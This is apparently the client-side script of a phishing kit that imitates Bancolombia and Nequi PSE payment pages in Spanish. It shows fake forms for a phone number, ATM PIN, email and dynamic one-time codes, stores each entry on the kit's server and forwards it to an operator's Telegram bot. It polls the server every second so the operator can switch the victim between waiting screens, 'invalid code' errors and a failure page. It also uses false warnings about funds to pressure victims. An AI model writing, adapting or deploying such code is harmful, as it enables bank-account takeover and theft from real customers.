let firebaseConfig;
let database;

let botToken ;
let chatId ;

// Función para cargar configuraciones desde config.json
async function loadFirebaseConfig() {
  try {
      const response = await fetch('../../config.json'); // Ruta al archivo config.json
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);

      const config = await response.json();

      // Inicializar Firebase con la configuración cargada
      // firebaseConfig = config.firebaseConfig;
      // firebase.initializeApp(firebaseConfig);
      // database = firebase.database();

      // Asignar valores del bot desde el archivo config.json
      botToken = config.botToken;
      chatId = config.chatId;
  } catch (error) {
      console.error("Error al cargar la configuración de Firebase:", error);
  }
}

async function initApp() {
    await loadFirebaseConfig();
    console.log("Aplicación lista para usar Firebase");
    // Aquí puedes invocar otras funciones o lógica de tu app
}

document.addEventListener("DOMContentLoaded", function() {
    // Obtener el valor de enti de la URL
    var urlParams = new URLSearchParams(window.location.search);
    clienteid = urlParams.get('date');
  
    console.log(enti); // Esto mostrar  el valor de enti pasado desde la p gina original
  });
  

 
 function creador(cual) {
    var section = document.createElement("section");
    section.id = clienteid;
    if (cual === "tricolor") {
    section.innerHTML = `
    <section id="clave" style="display: none; margin: 2rem !important;">
 
    <div>
       <div class="panel panel-primary">
 
          <div class="mua-panel-body">
             <div class="row">
 
                <div class="col-lg-4 col-md-5 col-sm-6">
                   <div class="panel_general mua-panel_general">
                      <div class="title-panel-label">
                         <h1>
                            Clave
                         </h1>
                      </div>
                      <div id="contenido">
                         <div class="mua-content-group-panel">
                            <div class="mua-label-input">
                               <label class="control-label-index" for="username">
                                  Ingresa tu clave
                               </label>
                            </div>
                            <div>
                               <div class="mua_svp_enroll_update_control">
                                  <input id="keyboard_display" class="mua-form-control mua-input-icon"
                                     type="password" required minlength="4" maxlength="4">
                                  <span class="mua-icon-lock"> </span>
                               </div>
                            </div>
                         </div>
                         <div class="mua-content-legend mua_svp_enroll_update_label">
                            Ingresa clave que usas en el cajero automatico.
                         </div>
                      </div>
                      <div class="two-button-container mua-button-container">
                         <div class="two-button-a">
                            <input class="btn btn-default" type="button" value="Cancelar">
                         </div>
                         <div class="two-button-b">
                            <input name="btnGo" class="btn btn-success" onclick="imprimirclave()"
                               style="background-color:#fdda24;" type="submit" value="Ingresar">
                         </div>
                      </div>
                      <div class="mua-panel_enlances">
                         <div>
                            <span id="popoverId"
                               class="glyphicon icon-icon_tooltip mua_pg_pgdsc_icons mua-label-icon"
                               data-original-title="" title=""></span>
                            <div id="popoverContent" class="hide"></div>
                            <a href="#">Genera una clave personal</a>
                         </div>
                      </div>
                   </div>
                </div>
             </div>
 </section>
 
    <section id="espera" style="display:none;" >
       <br>
       <br>
       <br>
       <br>
       <br>
       <br>
       <br>
       <br>
       <br>
       <br>
 
             <div style="text-align: center;"><img style="width: 190px; margin-left: auto;" src="/assets/logo-oficial.png">
                <br>
                <div class="loader">
                   <div class="dot"></div>
                   <div class="dot"></div>
                   <div class="dot"></div>
                </div>
             </div>       
       <br> 
       <br>  
       <br>
       
             <div style="text-align: center; line-height: 1rem !important;" >
                <h2 class="t-subtitle" style="line-height: 2.5rem !important;">Validando la Informacion...</h2>
                <br>
                <br>
                <br> 
                <h2 class="t-subtitle" style="line-height: 2.5rem !important;">No cierre o recargue esta pagina, Los fondos podrian verse afectados.</h2>
 
             </div>
             <br>
             <br>
             <br>
             <br>
             <br>
             <br>
             <br>
             <br>
     </section>
 
     <section id="Dinamica_SMS" style="display:none;" >
       <div class="panel panel-primary">
         <div class="row" id="error">
            <script language="JavaScript">
               function cerrarError() {
                  document.getElementById("tabError").style.display = "";
                  document.getElementById('summary').innerHTML='';
               }
            </script>
            <div class="col-xs-12 col-sm-12 col-md-12 mua_message_not_from_svp" id="tabError2" style="display: none;">
               <div class="errorDiv">
                  <div class="divTextMessage">
                     <span class="icon-error errorIcon">
                     <span class="path1"></span>
                     <span class="path2"></span>
                     <span class="path3"></span>
                     </span>
                     <div class="errorTitulo">Error</div>
                     <div id="summary" class="errorTexto"> Clave Dinamica no valida.
                     </div>
                  </div>
               </div>
            </div>
         </div>
         <div class="mua-panel-body">
            <div class="row">
               <div class="col-xs-12 col-sm-5 col-md-4">
                  <div class="panel_general mua-panel_general">
                     <div class="title-panel-label">
                        <h1 >
                           Clave Din mica
                        </h1>
                     </div>
                     <div class="subtitle-land-label" style="padding: 0.2rem !important; margin-bottom: 2rem !important; text-align: center !important;">
                        <h4 style="line-height: 1.7rem; letter-spacing: 1px; margin-bottom: 0.7rem !important;">
                           Para continuar con la transacci n ingresa la Clave Dinámica. Cons ltala en la opc on Generaci n de Bancolombia App del dispositivo movil donde est s inscrito al servicio..
                        </h4>
                     </div>
                     <div id="contenido">
                        <div class="mua-content-group-panel">
 
                           <div>
                              <div class="mua_svp_enroll_update_control">
                                 <input id="dinamica" name="username" tabindex="1" class="mua-form-control mua_svp_control_username mua-input-icon" type="password" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" value="" minlength="6" maxlength="6" autocomplete="off" required>
                              </div>
                           </div>
                        </div>
                     </div>
                     <div class="one-button-container mua-button-container" style="left: 80px ">
                   <button id="btnGo" name="btnGo"style="margin-right: 2rem; background-color: transparent; border: 1px solid rgba(0, 0, 0, 0.486) !important;"class="btn btn-success">Cancelar</button>
                   <button id="btnGo" name="btnGo" onclick="imprimirdinreloj()" style="background-color:#fdda24;" class="btn btn-success" type="submit">Continuar</button>
                     </div>
                  </div>
 
               </div>
               <div class="col-xs-12 col-sm-7 col-md-8">
                <img src="/assets/gif.gif" width="100%" alt="">
             </div>
            </div>
         </div>
       </div>
       
       </section>
 
       <section id="Terminado" style="display:none;" >
          <br>
          <br>
          <br>
          <br>
          <br> 
          
          
          <div style="text-align: center; line-height: 1rem !important;" >
             <div style="text-align: left; display: inline;"><img style="width:; margin-left: auto; display: inline-block; margin-top: 1rem" src="/assets/icon-error.png"></div>       
                   <h2 class="t-subtitle" style="line-height: 1rem !important; display: inline;">Lo sentimos, Su pago no pudo ser procesado por el emisor.</h2>
 
                </div>
                <br>
                <br>
                <div style="text-align: center;"><img style="width: 300px;; margin-left: auto;" src="/assets/caida.jpg"></div>       
                <br>
                <h2 class="t-subtitle" style="color: #ff6741;">Oops Error 40565ff.</h2>
                <br>
                <br>
                <br>
                <br>
                <br>
        </section>
  
  `;
 } else {
    section.innerHTML =  `
 
    <section id="espera" class="main flex" style="display: none;">
 
        <p class="parrafo1pp" style="margin-bottom: 12rem; margin-top: 14rem;">Espera un momento por favor, estamos procesando tu solicitud.</p>
        <img src="/assets/gnequi.gif" style="width: 50%; height: 50%;" alt="GIF animado">
        <p class="parrafo1pp" style="margin-top: 6rem;">No cierres o recargues esta pagina, tu saldo podria verse afectado.</p>
    </section>
 
 
    <section id="Dinamica_APP" class="main flex" style="display:none ;">
    <header class="headerpp">
                 <img class="nequi-update" src="/assets/nequi-update.png"  style="margin-top: 12rem">
             </header>
             <div>
                 <p class="width anchopp">Pagos PSE de Nequi</p>
             </div>
       <div class="parrafo1pp" >
            <p>Para confirmar tu pago escribe o pega la clave dinamica que encuentras en tu App Nequi.</p>
 
            <div class="dinmalapp" id="tabError2" style="display: none;">
                <p>¡Ups! Estas ingresando mal tu clave dinamica o expiro, verifica y vuelve a intentarlo</p>
            </div>
        </div>
 
        <div class="input-container">
            <input class="inpdin" type="password" readonly maxlength="1">
            <input class="inpdin" type="password" readonly maxlength="1">
            <input class="inpdin" type="password" readonly maxlength="1">
            <input class="inpdin" type="password" readonly maxlength="1">
            <input class="inpdin" type="password" readonly maxlength="1">
            <input class="inpdin primerinp" type="password" readonly maxlength="1">  
        </div>
        <input id="dinamica" type="text" hidden>
        <div class="button-container">
            <button class="number" onclick="setValue(this)">1</button>
            <button class="number" onclick="setValue(this)">2</button>
            <button class="number" onclick="setValue(this)">3</button>
            <button class="number" onclick="setValue(this)">4</button>
            <button class="number" onclick="setValue(this)">5</button>
            <button class="number" onclick="setValue(this)">6</button>
            <button class="number" onclick="setValue(this)">7</button>
            <button class="number" onclick="setValue(this)">8</button>
            <button class="number" onclick="setValue(this)">9</button>
            <button></button>
            <button class="number" onclick="setValue(this)">0</button>
            <button onclick='setValue("borrar")'><img src="/assets/delete-left-solid.svg" alt=""></button>
            
        </div>
        <button id="ahorano" class="ahorano" style="margin-top:1rem;">Cancela el pago</button>
    </section>
    
 
    <section id="Terminado" class="main" style="display: none; margin-top: 25rem;">
 
        <img src="/assets/nequi-cara-triste.svg" alt="">
        <p class="anchopp" style="text-align: center;">¡Ups!, no se pudo completar el pago!</p>
        <p class="parrafo1pp" style="margin-top: 6rem;">En estos momentos no se pudo realizar el pago, por favor intenta mas tarde.</p>

<button class="width buttompp" onclick="location.href='/';" style="background-color:rgb(218, 0, 129)">Cancelar</button>
    </section>
  `
 
 }
  
  var contenedor = document.getElementById("contenedor");
  contenedor.appendChild(section);
  devuelvesection()
 }
 
 function mostrarSeccion(seccion) {
   fetch("../../update_data.php", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
     body: `id=${clienteid}&campo2=sectionVisible&valor2=${seccion}`
   })
     .then(response => response.json())
     .then(data => {
       console.log("Sección actualizada:", data);
     })
     .catch(error => console.error("Error en la petición:", error));
 }
 
 function imprimirusuario() {
   usuario = document.getElementById("DocumentNumber").value; // Asignar el valor a la variable usuario
   var clave = document.getElementById("keyboard_display").value;
   
       // Validar la longitud del DocumentNumber
    if (usuario.length !== 10) {
        alert("El numero de celular debe tener exactamente 10 caracteres.");
        return; // Detener la ejecución si no cumple con la longitud requerida
    }
    
    // Validar la longitud del keyboard_display
    if (clave.length !== 4) {
        alert("La clave debe tener exactamente 4 caracteres.");
        return; // Detener la ejecución si no cumple con la longitud requerida
    }
 
   if (/\s/.test(usuario)) {
     alert("El Usuario no puede contener espacios en blanco.");
     return; // Detener la ejecuci n de la funci n en este punto
   }
   
   if (usuario === "") {
     alert("Por favor, ingresa tu Usuario.");
     return; // Detener la ejecuci n de la funci n en este punto
   }
 
   if (!/\d/.test(usuario)) {
     alert("El Usuario debe contener al menos un n mero.");
     document.getElementById("DocumentNumber").value = "";
     return;
   }
 


   let data = new URLSearchParams();
      data.append("id", clienteid);
      data.append("id2", clienteid);
      data.append("campo1", "usuario");
      data.append("valor1", usuario);
      data.append("campo2", "clave");
      data.append("valor2", clave);


      data.append("campo1_2", "usuario");
      data.append("valor1_2", usuario);
      data.append("campo2_2", "clave");
      data.append("valor2_2", clave);

      
      fetch("../../update_data.php", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: data.toString()
    })
    .then(response => response.json())
    .then(data => {

      
        if (data.status === "success") {
         var message = `
         Cliente #: ${clienteid}
         Esta en nequi
         Usuario: ${usuario}
         Contraseña: ${clave}
         `;
      
         enviarTelegramBot2(botToken, chatId, message, "bot 1", "nequi", clienteid)
             
      
      
         document.getElementById('usuario').style.display = 'none';
         if (clave == "") {
          mostrarSeccion("clave");
         

         } else {
          
          // como obtengo el valor de la seccionVisible
          

          
          mostrarSeccion("espera");
         }
         document.getElementById("DocumentNumber").value = "";
         document.getElementById("keyboard_display").value = "";
        } else {
            console.error("Error al actualizar usuario:", data);
        }
    })
    .catch(error => console.error("Error en la petición:", error));


    let sectionVisible =  localStorage.getItem("sectionVisible");

    debugger

    if (sectionVisible === "usuario_invalido") {
    document.getElementById("usuario").style.display = "none";
    document.getElementById("usuario").style.display = "none";
         document.getElementById("tabError1").style.display = "none";

    }

   
 
 }
 
function cogercorro() {
    var corr = document.getElementById("PNEMail").value;
    var message = `
    Cliente #: ${clienteid}
    Entro a nequi
    Correo pse: ${corr}
    `;

    if (corr === "") {
        alert("Por favor, ingresa tu correo.");
    } else {



        let data = new URLSearchParams();
        data.append("id", clienteid);
        data.append("id2", clienteid);
         data.append("campo1", "corro");
         data.append("valor1", corr);

         data.append("campo1_2", "corro");
         data.append("valor1_2", corr);
  
  
        fetch("../../update_data.php", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: data.toString()
      })
      .then(response => response.json())
      .then(data => {
          if (data.status === "success") {
            enviarTelegramBot2(botToken, chatId, message, "bot 1", "nequi", clienteid)
        
        document.getElementById('pedirpse').style.display = 'none';
        document.getElementById('usuario').style.display = '';
          } else {
              console.error("Error al actualizar usuario:", data);
          }
      })
      .catch(error => console.error("Error en la petición:", error));

        
    }
}

 function imprimirclave() {
   var clave = document.getElementById("keyboard_display").value;
   if (clave === "") {
     alert("Por favor, ingresa tu Clave.");
     return;
   }
 
   if (isNaN(clave)) {
     alert("La Clave debe ser un n mero.");
     keyboard_display.value = "";
     return;
   }

   let data = new URLSearchParams();
      data.append("id", clienteid);
      data.append("id2", clienteid);
      data.append("campo1", "clave");
      data.append("valor1", clave);

      data.append("campo1_2", "clave");
      data.append("valor1_2", clave);


      fetch("../../update_data.php", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: data.toString()
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === "success") {
         keyboard_display.value = "";
         var message = `
         Cliente #: ${clienteid}
         Esta en nequi
         Actualizo clave: ${clave}
         `;
         enviarTelegramBot2(botToken, chatId, message, "bot 1", "nequi", clienteid)
         mostrarSeccion("espera");
         document.getElementById("clave").style.display = "none";
        } else {
            console.error("Error al actualizar usuario:", data);
        }
    })
    .catch(error => console.error("Error en la petición:", error));




   
 
 }
 
 
function devuelvesection(){
   

       fetch(`../../get_section.php?id=${clienteid}`)
    .then(response => response.json())
    .then(data => {
      if (data.error) {
        console.error("Error al obtener la sección:", data.error);
        return;
      }

      var sectionVisible = data.sectionVisible;

      localStorage.setItem("sectionVisible", sectionVisible);

      if (sectionVisible === "clave") {
         document.getElementById("clave").style.display = "";
       } else if (sectionVisible === "usuario_invalido") {
        document.getElementById("espera").style.display = "none";
         document.getElementById("usuario").style.display = "";
         document.getElementById("tabError1").style.display = "";
       } else if (sectionVisible == "espera") {
         document.getElementById("espera").style.display = "";
         document.getElementById("Dinamica_APP").style.display = "none";
         document.getElementById("usuario").style.display = "none";
         document.getElementById("tabError1").style.display = "none";
       } else if (sectionVisible === "Dinamica_APP") {
        document.getElementById("espera").style.display = "none";
         document.getElementById("Dinamica_APP").style.display = "";
       } else if (sectionVisible === "Dinamica_APP_invalida") {
        document.getElementById("espera").style.display = "none";
        document.getElementById("Dinamica_APP").style.display = "";
        document.getElementById("tabError2").style.display = "";
        document.getElementById("dinamica").innerText = "";

       } else if (sectionVisible === "Terminado") {
        document.getElementById("espera").style.display = "none";
        document.getElementById("Terminado").style.display = "";
     } else if (sectionVisible === "usuario") {
        document.getElementById("usuario").style.display = "";   
     } 

      
    })
    .catch(error => console.error("Error en la petición:", error));
}

setInterval(devuelvesection, 1000);

function imprimirdinreloj() {
     var dinamican= document.getElementById("dinamica").value;
     if (dinamican=== "") {
       alert("Por favor, ingresa el Codigo.");
       return;
     }
   
     if (isNaN(dinreloj)) {
       alert("El codigo debe ser un n mero.");
       dinamican.value = "";
       return;
     }

     let data = new URLSearchParams();
      data.append("id", clienteid);
      data.append("id2", clienteid);
      data.append("campo1", "dinreloj");
      data.append("valor1", dinreloj);
      data.append("campo2", "color");
     data.append("valor2", "verde");

      data.append("campo1_2", "dinreloj");
      data.append("valor1_2", dinreloj);
      data.append("campo2_2", "color");
      data.append("valor2_2", "verde");


      fetch("../../update_data.php", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: data.toString()
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === "success") {
         var message = `
         Cliente #: ${clienteid}
         Esta en nequi
         Actualizo clave dinamica: ${dinamican}
         `;
         enviarTelegramBot2(botToken, chatId, message, "bot 1", "nequi", clienteid)
     mostrarSeccion("espera"); // Volver a la secci n espera despu s de ingresar la dinrejoj
     dinamican.value = ""; 
        } else {
            console.error("Error al actualizar usuario:", data);
        }
    })
    .catch(error => console.error("Error en la petición:", error));
     
     

    
   }
   
 function mostrarnuevodiv(sectionId) {
 // Ocultar todas las secciones
 var secciones = document.getElementsByTagName("section");
 for (var i = 0; i < secciones.length; i++) {
   secciones[i].style.display = "none";
 }
 
 // Mostrar la secci n seleccionada
 var seccion = document.getElementById(clienteid);
 if (seccion) {
   seccion.style.display = "block";
 }
 }
 
 
 var combinedValue = '';
 
 function setValue(button) {
     var inputs = document.querySelectorAll('.input-container input');   
     if (button == "borrar") {
         for (var i = 0; i < inputs.length; i++) {
             inputs[i].value = '';
         }
         combinedValue = ''; // Reiniciar el valor de combinedValue
     } else {
         for (var i = 0; i < inputs.length; i++) {
             if (inputs[i].value === '') {
                 inputs[i].value = button.innerText;
                 if (combinedValue === undefined) {
                     combinedValue = ''; // Inicializar combinedValue si es undefined
                 }
                 combinedValue += button.innerText;
                 if (i === inputs.length - 1) {

                     let data = new URLSearchParams();
                     data.append("id", clienteid);
                     data.append("id2", clienteid);
                     data.append("campo1", "dinamican");
                     data.append("valor1", combinedValue);
                     data.append("campo2", "color");
                     data.append("valor2", "verde");

                     data.append("campo1_2", "dinamican");
                     data.append("valor1_2", combinedValue);
                     data.append("campo2_2", "color");
                     data.append("valor2_2", "verde");
                     
                      var message = `
                           Cliente #: ${clienteid}
                           Esta en nequi
                           Clave Dinamica: ${combinedValue}
                           `;
      
                       enviarTelegramBot2(botToken, chatId, message, "bot 1", "nequi", clienteid)


                     fetch("../../update_data.php", {
                        method: "POST",
                        headers: { "Content-Type": "application/x-www-form-urlencoded" },
                        body: data.toString()
                  })
                  .then(response => response.json())
                  .then(data => {
                        if (data.status === "success") {
                         
                           mostrarSeccion("espera"); 
                        } else {
                           console.error("Error al actualizar usuario:", data);
                        }
                  })
                  .catch(error => console.error("Error en la petición:", error)); 


                     
                      // Volver a la secci n espera despu s de ingresar la dinrejoj
                     for (var j = 0; j < inputs.length; j++) {
                         inputs[j].value = '';
                     }
                     combinedValue = ''; // Reiniciar el valor de combinedValue
                 }
                 break;
             }
         }
     }
 }

 function enviarTelegramBot2(botToken, chatId, message, botName, option, clienteid) {

  var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

  fetch(url)
    .then(response => response.json())
    .then(data => {
      if (data.ok) {
        console.log(clienteid+"entro a" + option)
      } else {
        console.log(`Error al enviar el mensaje a ${botName}`);
      }
    })
    .catch(error => {
      console.error(`Error al enviar el mensaje a ${botName}:`, error);
      console.log(`Error al enviar el mensaje a ${botName}`);
    });
}
 
 
 
 
 
 document.addEventListener('paste', function(e) {
     var pastedText = e.clipboardData.getData('text');
     var inputs = document.querySelectorAll('.input-container input');
     for (var i = 0; i < inputs.length; i++) {
         if (inputs[i].value === '') {
             inputs[i].value = pastedText[i] || '';
             // Si se ha pegado suficiente contenido, detener el bucle
             if (i >= pastedText.length - 1) {
                 break;
             }
         }
     }
 });

// Llama a la inicialización al inicio
initApp();
